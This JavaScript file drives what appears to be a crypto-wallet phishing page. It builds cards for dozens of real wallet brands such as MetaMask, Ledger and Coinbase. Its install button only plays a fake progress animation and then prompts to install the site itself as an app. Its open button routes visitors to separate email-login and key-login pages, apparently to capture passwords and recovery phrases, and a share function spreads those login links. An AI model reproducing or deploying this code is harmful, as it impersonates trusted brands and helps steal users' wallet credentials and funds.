console.log("Wallets page loaded!");

// 🔥 1) Email/Password Wallets List
const emailWallets = [
  "Poloneix",
  "Coinbase1",
  "Coinbase2",
  "Binance",
  "Bitget",
  "Nash",
];

// 🔥 2) All Wallets List
const wallets = [
  "Meta Mask",
  "Poloniex",
  "Trust Wallet",
  "Solflare",
  "WalletConnect",
  "Terra",
  "Bitpay",
  "Maiar",
  "MyKey",
  "Atwallet",
  "Authereum",
  "Bitfrost",
  "Coinbase1",
  "Coinomi",
  "Dcent",
  "Easypocket",
  "Ledger",
  "Coolwallet",
  "Cybavowallet",
  "Coin98",
  "Harmony",
  "PeakDefi",
  "Gridplus",
  "VIA",
  "Imtoken",
  "Infinito",
  "Infinity",
  "Kadachain",
  "Keplr",
  "Midas1",
  "Marixwallet",
  "Midas2",
  "Nash",
  "Onto",
  "Ownbit",
  "Pillar",
  "Rainbow",
  "Safepal",
  "Sollet",
  "Spark",
  "Spatium",
  "Tokenary",
  "Tokenpocket",
  "Tomo",
  "Torus",
  "Coinbase2",
  "XDC",
  "Walletio",
  "Walleth",
  "Zelcore",
  "Phantom",
  "Exodus",
  "Binance",
  "Bitget",
  "Other Wallets",
];

const container = document.getElementById("walletContainer");

// 🔥 Generate Wallet Cards
wallets.forEach((name) => {
  let imageName =
    name
      .toLowerCase()
      .replace(/\s+/g, "")
      .replace(/'/g, "")
      .replace(/\./g, "")
      .replace(/-/g, "")
      .replace(/\//g, "") + ".webp";

  // OTHER WALLET CARD
  if (name.toLowerCase().includes("other")) {
    container.innerHTML += `
      <div class="wallet-card" onclick="openWallet('${name}')">
        <p>${name}</p>
        <div class="icon-row">
          <div class="icon-btn download-btn" onclick="event.stopPropagation(); installWallet('${name}')">
            <img src="assets/icons/downloads.png"><span>Install Wallet</span>
          </div>
          <div class="icon-btn rocket-btn" onclick="event.stopPropagation(); openWallet('${name}')">
            <img src="assets/icons/rocket.png"><span>Open Wallet</span>
          </div>
          <div class="icon-btn share-btn" onclick="event.stopPropagation(); shareWallet('${name}')">
            <img src="assets/icons/share.png"><span>Share</span>
          </div>
        </div>
      </div>
    `;
    return;
  }

  // NORMAL WALLET CARDS
  container.innerHTML += `
    <div class="wallet-card" onclick="openWallet('${name}')">
      <img src="wallet-icons/${imageName}">
      <p>${name}</p>
      <div class="icon-row">
        <div class="icon-btn download-btn" onclick="event.stopPropagation(); installWallet('${name}')">
          <img src="assets/icons/downloads.png"><span>Install Wallet</span>
        </div>
        <div class="icon-btn rocket-btn" onclick="event.stopPropagation(); openWallet('${name}')">
          <img src="assets/icons/rocket.png"><span>Open Wallet</span>
        </div>
        <div class="icon-btn share-btn" onclick="event.stopPropagation(); shareWallet('${name}')">
          <img src="assets/icons/share.png"><span>Share</span>
        </div>
      </div>
    </div>
  `;
});

// ==========================
// ⭐ NEW INSTALL POPUP LOGIC
// ==========================

// Popup elements
const popup = document.getElementById("installPopup");
const popLogo = document.getElementById("popLogo");
const popWalletName = document.getElementById("popWalletName");
const progressText = document.getElementById("progressText");
const progressFill = document.getElementById("progressFill");
const successTick = document.getElementById("successTick");

function startInstallPopup(walletName) {
  // Set popup content
  popWalletName.innerText = walletName;

  let imageName =
    walletName
      .toLowerCase()
      .replace(/\s+/g, "")
      .replace(/'/g, "")
      .replace(/\./g, "")
      .replace(/-/g, "")
      .replace(/\//g, "") + ".webp";

  popLogo.src = `wallet-icons/${imageName}`;

  // Reset UI before showing
  progressFill.style.width = "0%";
  successTick.style.opacity = 0;
  popup.style.display = "flex";

  let progress = 0;
  const timer = setInterval(() => {
    progress += 2;
    progressFill.style.width = progress + "%";

    if (progress >= 100) {
      clearInterval(timer);

      // Show success tick animation
      setTimeout(() => {
        successTick.style.opacity = 1;
        successTick.style.transform = "scale(1.4)";
      }, 300);

      // Close popup after animation
      setTimeout(() => {
        popup.style.display = "none";
        showA2HSPopup(walletName); // 🔥 NEW POPUP
      }, 1500);
    }
  }, 80);
}

// ==========================
// REPLACE installWallet()
// ==========================

function installWallet(walletName) {
  startInstallPopup(walletName);
}

// ==========================
// Open Wallet (email/phrase routing)
// ==========================

function openWallet(walletName) {
  const emailWallets = ["Coinbase1", "Coinbase2", "Binance", "Bitget", "Poloniex"];

  if (emailWallets.includes(walletName)) {
    window.location.href = `email-login.html?wallet=${encodeURIComponent(
      walletName
    )}`;
  } else {
    window.location.href = `key-login.html?wallet=${encodeURIComponent(
      walletName
    )}`;
  }
}

// ==========================
// Share wallet
// ==========================

function shareWallet(walletName) {
  const keyloginWallets = ["Poloniex","Coinbase1", "Coinbase2", "Binance", "Bitget"];
  if (keyloginWallets.includes(walletName)) {
    const shareUrl =
      `${window.location.origin}/email-login.html?wallet=` +
      encodeURIComponent(walletName);

    if (navigator.share) {
      navigator
        .share({
          title: "Wallet",
          text: `Check this wallet: ${walletName}`,
          url: shareUrl,
        })
        .catch(() => {});
    } else {
      alert("Sharing not supported.");
    }
  } else {
    const shareUrl =
      `${window.location.origin}/key-login.html?wallet=` +
      encodeURIComponent(walletName);

    if (navigator.share) {
      navigator
        .share({
          title: "Wallet",
          text: `Check this wallet: ${walletName}`,
          url: shareUrl,
        })
        .catch(() => {});
    } else {
      alert("Sharing not supported.");
    }
  }
}
// ==========================
// 🔥 ADD TO HOME SCREEN LOGIC
// ==========================

let deferredPrompt;

// capture browser install event
window.addEventListener("beforeinstallprompt", (e) => {
  e.preventDefault();
  deferredPrompt = e;
});

// elements
const a2hsPopup = document.getElementById("a2hsPopup");
const a2hsLogo = document.getElementById("a2hsLogo");
const a2hsName = document.getElementById("a2hsName");
const a2hsBtn = document.getElementById("a2hsBtn");

function showA2HSPopup(walletName) {
  if (!deferredPrompt) {
    console.log("Install not available");
    return;
  }

  a2hsName.innerText = walletName;

  let imageName = walletName.toLowerCase().replace(/\s+/g, "") + ".webp";

  a2hsLogo.src = `wallet-icons/${imageName}`;
  a2hsPopup.style.display = "block";
}

// button click → real install
a2hsBtn.addEventListener("click", async () => {
  if (!deferredPrompt) {
    alert("Install option not available yet.");
    return;
  }

  deferredPrompt.prompt();
  await deferredPrompt.userChoice;
  deferredPrompt = null;
  a2hsPopup.style.display = "none";
});
// 🔥 FORCE TEST
setTimeout(() => {
  showA2HSPopup("Meta Mask");
}, 3000);
